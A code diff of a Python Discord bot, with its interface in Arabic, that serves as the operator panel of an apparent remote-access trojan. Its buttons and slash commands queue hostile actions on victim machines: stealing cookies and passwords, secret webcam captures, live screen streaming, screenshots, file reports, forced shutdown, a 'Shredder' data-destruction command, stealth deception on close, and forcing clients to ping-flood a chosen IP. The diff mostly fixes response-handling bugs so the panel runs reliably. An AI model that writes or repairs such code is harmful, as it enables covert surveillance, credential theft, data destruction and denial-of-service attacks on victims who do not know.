@@ -1,6 +1,3 @@
-Python
-
-
 import os
 import base64
 import json
@@ -85,7 +82,8 @@ class ConfirmSaveView(discord.ui.View):
 
     @discord.ui.button(label="نعم، حفظ الأكواد", style=discord.ButtonStyle.green, custom_id="save_codes_yes")
     async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if not db:
             await interaction.followup.send("❌ فشل الاتصال بغيت هب.", ephemeral=True)
@@ -109,11 +107,13 @@ class ConfirmSaveView(discord.ui.View):
 
     @discord.ui.button(label="لا، إلغاء", style=discord.ButtonStyle.red, custom_id="save_codes_no")
     async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         try:
             await interaction.message.delete()
         except Exception:
             pass
-        await interaction.response.send_message("❌ تم إلغاء العملية.", ephemeral=True)
+        await interaction.followup.send("❌ تم إلغاء العملية.", ephemeral=True)
 
 class CodesSubMenuView(discord.ui.View):
     def __init__(self):
@@ -121,7 +121,8 @@ class CodesSubMenuView(discord.ui.View):
 
     @discord.ui.button(label="🟢 غير المستخدمة (المتاحة)", style=discord.ButtonStyle.success, custom_id="sub_codes_unused", row=0)
     async def unused_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, _, _, _ = fetch_db()
         if not db:
             await interaction.followup.send("❌ خطأ بالاتصال.", ephemeral=True)
@@ -135,7 +136,8 @@ class CodesSubMenuView(discord.ui.View):
 
     @discord.ui.button(label="🔴 المستخدمة والـ IP", style=discord.ButtonStyle.secondary, custom_id="sub_codes_used", row=0)
     async def used_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, _, _, _ = fetch_db()
         if not db:
             await interaction.followup.send("❌ خطأ.", ephemeral=True)
@@ -149,7 +151,8 @@ class CodesSubMenuView(discord.ui.View):
 
     @discord.ui.button(label="🚫 المحظورة", style=discord.ButtonStyle.danger, custom_id="sub_codes_blacklist", row=1)
     async def blacklist_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, _, _, _ = fetch_db()
         if not db:
             await interaction.followup.send("❌ خطأ.", ephemeral=True)
@@ -163,7 +166,8 @@ class CodesSubMenuView(discord.ui.View):
 
     @discord.ui.button(label="⚡ توليد كود سريع", style=discord.ButtonStyle.primary, custom_id="sub_codes_gen", row=1)
     async def gen_quick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if not db:
             await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
@@ -189,7 +193,8 @@ class DeleteUnusedCodeButton(discord.ui.Button):
         self.code = code
 
     async def callback(self, interaction: discord.Interaction):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if not db:
             await interaction.followup.send("❌ خطأ بالاتصال.", ephemeral=True)
@@ -214,7 +219,8 @@ class BlacklistActionSelectButton(discord.ui.Button):
 
     async def callback(self, interaction: discord.Interaction):
         view = BlacklistOptionsView(self.code)
-        await interaction.response.send_message(f"⚙️ **خيارات الكود المحظور:** `{self.code}`", view=view, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.send_message(f"⚙️ **خيارات الكود المحظور:** `{self.code}`", view=view, ephemeral=True)
 
 class BlacklistOptionsView(discord.ui.View):
     def __init__(self, code):
@@ -223,7 +229,8 @@ class BlacklistOptionsView(discord.ui.View):
 
     @discord.ui.button(label="🔓 فك الحظر", style=discord.ButtonStyle.success, custom_id="b_opt_unban")
     async def unban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if not db: return
         if self.code in db.get("blacklisted_codes", []):
@@ -236,7 +243,8 @@ class BlacklistOptionsView(discord.ui.View):
 
     @discord.ui.button(label="🗑️ حذف نهائي", style=discord.ButtonStyle.danger, custom_id="b_opt_delete")
     async def delete_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if not db: return
         if self.code in db.get("blacklisted_codes", []):
@@ -264,11 +272,12 @@ class DeviceManageButton(discord.ui.Button):
         ip = self.info.get('ip', 'Unknown')
         port = self.info.get('port', '8888')
         view = DeviceActionsView(self.code, self.info.get("device"), ip, port)
-        await interaction.response.send_message(
-            f"⚙️ **لوحة التحكم المطلق بالعميل:**\n🔑 الكود: `{self.code}`\n🌐 IP : Port $\rightarrow$ `{ip} : {port}`\n🌍 الدولة: `{self.info.get('country')}`\n🔒 HWID: `{self.info.get('device')}`", 
-            view=view, 
-            ephemeral=True
-        )
+        if not interaction.response.is_done():
+            await interaction.response.send_message(
+                f"⚙️ **لوحة التحكم المطلق بالعميل:**\n🔑 الكود: `{self.code}`\n🌐 IP : Port $\rightarrow$ `{ip} : {port}`\n🌍 الدولة: `{self.info.get('country')}`\n🔒 HWID: `{self.info.get('device')}`", 
+                view=view, 
+                ephemeral=True
+            )
 
 class DeviceActionsView(discord.ui.View):
     def __init__(self, code, hwid, ip, port):
@@ -280,7 +289,8 @@ class DeviceActionsView(discord.ui.View):
 
     @discord.ui.button(label="🚫 حظر الكود والهاردوير", style=discord.ButtonStyle.danger, custom_id="dev_act_ban", row=0)
     async def ban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "blacklisted_codes" not in db: db["blacklisted_codes"] = []
@@ -294,7 +304,8 @@ class DeviceActionsView(discord.ui.View):
 
     @discord.ui.button(label="👢 طرد بدون حظر", style=discord.ButtonStyle.primary, custom_id="dev_act_kick", row=0)
     async def kick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "targeted_kick_messages" not in db: db["targeted_kick_messages"] = {}
@@ -304,7 +315,8 @@ class DeviceActionsView(discord.ui.View):
 
     @discord.ui.button(label="📁 سحب كوكيز وكلمات المرور (أمر 1)", style=discord.ButtonStyle.primary, custom_id="dev_act_export_info", row=1)
     async def export_client_info_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "remote_exports" not in db: db["remote_exports"] = {}
@@ -314,7 +326,8 @@ class DeviceActionsView(discord.ui.View):
 
     @discord.ui.button(label="📸 التقاط صورة كاميرا سرية (أمر 4)", style=discord.ButtonStyle.secondary, custom_id="dev_act_webcam", row=1)
     async def webcam_snapshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "remote_webcams" not in db: db["remote_webcams"] = {}
@@ -324,7 +337,8 @@ class DeviceActionsView(discord.ui.View):
 
     @discord.ui.button(label="📸 سحب تقرير الملفات والصور", style=discord.ButtonStyle.secondary, custom_id="dev_act_files_report", row=2)
     async def files_report_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "remote_file_reports" not in db: db["remote_file_reports"] = {}
@@ -334,7 +348,8 @@ class DeviceActionsView(discord.ui.View):
 
     @discord.ui.button(label="📋 فحص البرامج المفتوحة", style=discord.ButtonStyle.primary, custom_id="dev_act_procs", row=2)
     async def procs_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "remote_procs_check" not in db: db["remote_procs_check"] = {}
@@ -344,7 +359,8 @@ class DeviceActionsView(discord.ui.View):
 
     @discord.ui.button(label="🔴 بدء البث الحي للشاشة", style=discord.ButtonStyle.danger, custom_id="dev_act_live", row=2)
     async def live_stream_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "remote_live_stream" not in db: db["remote_live_stream"] = {}
@@ -358,7 +374,8 @@ class DeviceActionsView(discord.ui.View):
 
     @discord.ui.button(label="👻 تفعيل الخداع عند الإغلاق (للعميل)", style=discord.ButtonStyle.secondary, custom_id="dev_act_enable_stealth_close", row=3)
     async def enable_stealth_close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "stealth_close_codes" not in db: db["stealth_close_codes"] = []
@@ -366,12 +383,11 @@ class DeviceActionsView(discord.ui.View):
                 db["stealth_close_codes"].append(self.code)
             if save_db(db, sha, url, headers, f"Enable stealth close for {self.code}"):
                 await interaction.followup.send(f"👻 تم تفعيل وضع الخداع عند الإغلاق للعميل `{self.code}` بنجاح!", ephemeral=True)
-            else:
-                await interaction.followup.send("❌ فشل الحفظ في السحابة.", ephemeral=True)
 
     @discord.ui.button(label="🛑 إغلاق البرنامج كلياً", style=discord.ButtonStyle.danger, custom_id="dev_act_force_close", row=3)
     async def force_close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "remote_force_close" not in db: db["remote_force_close"] = {}
@@ -381,7 +397,8 @@ class DeviceActionsView(discord.ui.View):
 
     @discord.ui.button(label="🪟 إغلاق الألعاب والخلفية", style=discord.ButtonStyle.secondary, custom_id="dev_act_kill", row=4)
     async def kill_proc_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "remote_killers" not in db: db["remote_killers"] = {}
@@ -391,7 +408,8 @@ class DeviceActionsView(discord.ui.View):
 
     @discord.ui.button(label="🔌 إيقاف تشغيل الجهاز (Shutdown)", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=4)
     async def shutdown_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "remote_shutdowns" not in db: db["remote_shutdowns"] = {}
@@ -401,7 +419,8 @@ class DeviceActionsView(discord.ui.View):
 
     @discord.ui.button(label="🔥 تدمير شامل (Shredder)", style=discord.ButtonStyle.danger, custom_id="dev_act_shred", row=4)
     async def shred_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "remote_shreds" not in db: db["remote_shreds"] = {}
@@ -417,7 +436,8 @@ class SendMsgModal(discord.ui.Modal, title="إرسال رسالة تحذيرية
         self.code = code
 
     async def on_submit(self, interaction: discord.Interaction):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "targeted_messages" not in db: db["targeted_messages"] = {}
@@ -432,11 +452,13 @@ class MainDashboardView(discord.ui.View):
     @discord.ui.button(label="🔑 إدارة الأكواد", style=discord.ButtonStyle.primary, custom_id="dash_main_codes", row=0)
     async def codes_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         view = CodesSubMenuView()
-        await interaction.response.send_message("📁 **قائمة إدارة الأكواد:** اختر القسم المطلوب:", view=view, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.send_message("📁 **قائمة إدارة الأكواد:** اختر القسم المطلوب:", view=view, ephemeral=True)
 
     @discord.ui.button(label="💻 الأجهزة والتحكم المطلق", style=discord.ButtonStyle.secondary, custom_id="dash_main_devices", row=0)
     async def devices_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         try:
             db, _, _, _ = fetch_db()
             if not db:
@@ -447,13 +469,14 @@ class MainDashboardView(discord.ui.View):
                 await interaction.followup.send("🟢 لا توجد أي أجهزة متصلة حالياً.", ephemeral=True)
                 return
             view = DevicesSubMenuView(devices_list)
-            await interaction.response.send_message("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)
+            await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)
         except Exception as e:
             await interaction.followup.send(f"❌ خطأ: {str(e)}", ephemeral=True)
 
     @discord.ui.button(label="🚨 تبديل الصيانة", style=discord.ButtonStyle.danger, custom_id="dash_maint", row=1)
     async def maint_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if not db: return
         if "settings" not in db: db["settings"] = {}
@@ -465,7 +488,8 @@ class MainDashboardView(discord.ui.View):
 
     @discord.ui.button(label="📦 نسخة احتياطية", style=discord.ButtonStyle.secondary, custom_id="dash_export", row=1)
     async def export_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
+        if not interaction.response.is_done():
+            await interaction.response.defer(thinking=True, ephemeral=True)
         db, _, _, _ = fetch_db()
         if not db: return
         file_content = json.dumps(db, indent=4).encode("utf-8")
@@ -491,7 +515,8 @@ async def generate_codes(interaction: discord.Interaction, count: int = 1):
 @client.tree.command(name="manage", description="التحكم بالعميل مباشرة عبر الـ IP والـ Port")
 @app_commands.describe(ip_port="اكتب الـ IP والـ Port بهذا الشكل مثلاً: 64.137.192.51:7680")
 async def manage_by_ip_port(interaction: discord.Interaction, ip_port: str):
-    await interaction.response.defer(thinking=True, ephemeral=True)
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
     db, _, _, _ = fetch_db()
     if not db:
         await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
@@ -520,7 +545,8 @@ async def manage_by_ip_port(interaction: discord.Interaction, ip_port: str):
 @client.tree.command(name="netscan", description="جلب تقرير كامل عن اتصالات الشبكة والـ IPs والـ Ports النشطة للعميل")
 @app_commands.describe(target="كود التفعيل أو الـ IP الخاص بالعميل")
 async def netscan_command(interaction: discord.Interaction, target: str):
-    await interaction.response.defer(thinking=True, ephemeral=True)
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
     if not db: return
     target_upper, target_clean = target.strip().upper(), target.strip()
@@ -541,7 +567,8 @@ async def netscan_command(interaction: discord.Interaction, target: str):
 @client.tree.command(name="trace", description="التتبع الجغرافي الحي ومسار الشبكة (Traceroute) للعميل")
 @app_commands.describe(target="كود التفعيل أو الـ IP الخاص بالعميل")
 async def trace_command(interaction: discord.Interaction, target: str):
-    await interaction.response.defer(thinking=True, ephemeral=True)
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
     if not db: return
     target_upper, target_clean = target.strip().upper(), target.strip()
@@ -562,7 +589,8 @@ async def trace_command(interaction: discord.Interaction, target: str):
 @client.tree.command(name="ping", description="فحص سرعة الاستجابة (Ping) وحالة الاتصال للعميل")
 @app_commands.describe(target="كود التفعيل أو الـ IP الخاص بالعميل")
 async def ping_command(interaction: discord.Interaction, target: str):
-    await interaction.response.defer(thinking=True, ephemeral=True)
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
     if not db: return
     target_upper, target_clean = target.strip().upper(), target.strip()
@@ -583,7 +611,8 @@ async def ping_command(interaction: discord.Interaction, target: str):
 @client.tree.command(name="pingflood", description="إجبار العميل على تنفيذ اختبار ضغط شبكي وإغراق بالبنج (Ping Flood)")
 @app_commands.describe(target_code="كود العميل", ip_target="الـ IP المستهدف (مثال: 8.8.8.8)")
 async def pingflood_command(interaction: discord.Interaction, target_code: str, ip_target: str):
-    await interaction.response.defer(thinking=True, ephemeral=True)
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
     if not db: return
     target_upper = target_code.strip().upper()
@@ -597,7 +626,8 @@ async def pingflood_command(interaction: discord.Interaction, target_code: str, 
 
 @client.tree.command(name="unused", description="عرض الأكواد غير المستخدمة مع خيارات الحذف")
 async def unused_command(interaction: discord.Interaction):
-    await interaction.response.defer(thinking=True, ephemeral=True)
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
     db, _, _, _ = fetch_db()
     if not db: return
     unused_list = [c for c, info in db.get("codes", {}).items() if not info.get("used", False)]
@@ -609,7 +639,8 @@ async def unused_command(interaction: discord.Interaction):
 
 @client.tree.command(name="clearused", description="حذف جميع الأكواد المستخدمة دفعة واحدة")
 async def clear_used_codes(interaction: discord.Interaction):
-    await interaction.response.defer(thinking=True, ephemeral=True)
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
     if not db or "codes" not in db: return
     old_count = len(db["codes"])
@@ -621,7 +652,8 @@ async def clear_used_codes(interaction: discord.Interaction):
 @client.tree.command(name="check", description="التحقق من حالة كود معين ومعرفة تفاصيله")
 @app_commands.describe(code="الكود المراد فحصه")
 async def check_code(interaction: discord.Interaction, code: str):
-    await interaction.response.defer(thinking=True, ephemeral=True)
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
     db, _, _, _ = fetch_db()
     if not db or code.upper() not in db.get("codes", {}):
         await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
@@ -633,7 +665,8 @@ async def check_code(interaction: discord.Interaction, code: str):
 @client.tree.command(name="delete", description="حذف كود نهائياً")
 @app_commands.describe(code="الكود المراد حذفه")
 async def delete_code(interaction: discord.Interaction, code: str):
-    await interaction.response.defer(thinking=True, ephemeral=True)
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
     code = code.upper()
     if not db or code not in db.get("codes", {}):
@@ -646,7 +679,8 @@ async def delete_code(interaction: discord.Interaction, code: str):
 @client.tree.command(name="resetdevice", description="تصفير ارتباط الكود وإرجاعه متاحاً")
 @app_commands.describe(code="الكود المراد تصفيره")
 async def reset_device(interaction: discord.Interaction, code: str):
-    await interaction.response.defer(thinking=True, ephemeral=True)
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
     code = code.upper()
     if not db or code not in db.get("codes", {}):
@@ -663,7 +697,8 @@ async def reset_device(interaction: discord.Interaction, code: str):
 @client.tree.command(name="screenshot", description="التقاط لقطة شاشة لجهاز عميل معين")
 @app_commands.describe(target="اسم الجهاز أو كود التفعيل المستهدف")
 async def screenshot_command(interaction: discord.Interaction, target: str):
-    await interaction.response.defer(thinking=True, ephemeral=True)
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
     if not db: return
     target_upper, target_clean = target.strip().upper(), target.strip()
@@ -683,6 +718,8 @@ async def screenshot_command(interaction: discord.Interaction, target: str):
 
 @client.tree.command(name="statsgui", description="لوحة معلومات وإحصائيات تفاعلية")
 async def stats_gui_command(interaction: discord.Interaction):
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
     db, _, _, _ = fetch_db()
     if not db: return
     codes = db.get("codes", {})
@@ -693,12 +730,13 @@ async def stats_gui_command(interaction: discord.Interaction):
     embed.add_field(name="📌 الإجمالي", value=f"`{total}`", inline=True)
     embed.add_field(name="🟢 المتاحة", value=f"`{available}`", inline=True)
     embed.add_field(name="🔴 المستخدمة", value=f"`{used}`", inline=True)
-    await interaction.response.send_message(embed=embed, view=MainDashboardView(), ephemeral=True)
+    await interaction.followup.send(embed=embed, view=MainDashboardView(), ephemeral=True)
 
 @client.tree.command(name="clear", description="حذف رسائل البوت وتنظيف الشاشة")
 @app_commands.describe(amount="عدد الرسائل المراد مسحها")
 async def clear_messages(interaction: discord.Interaction, amount: int = 10):
-    await interaction.response.defer(thinking=True, ephemeral=True)
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
     deleted = await interaction.channel.purge(limit=amount)
     await interaction.followup.send(f"🧹 تم تنظيف وحذف `{len(deleted)}` رسالة بنجاح!", ephemeral=True)
     await asyncio.sleep(3)
@@ -708,7 +746,8 @@ async def clear_messages(interaction: discord.Interaction, amount: int = 10):
 @client.tree.command(name="sync", description="مزامنة الأوامر")
 async def sync_commands(interaction: discord.Interaction):
     await client.tree.sync()
-    await interaction.response.send_message("✅ تم مزامنة الأوامر!", ephemeral=True)
+    if not interaction.response.is_done():
+        await interaction.response.send_message("✅ تم مزامنة الأوامر!", ephemeral=True)
 
 if TOKEN:
     client.run(TOKEN)
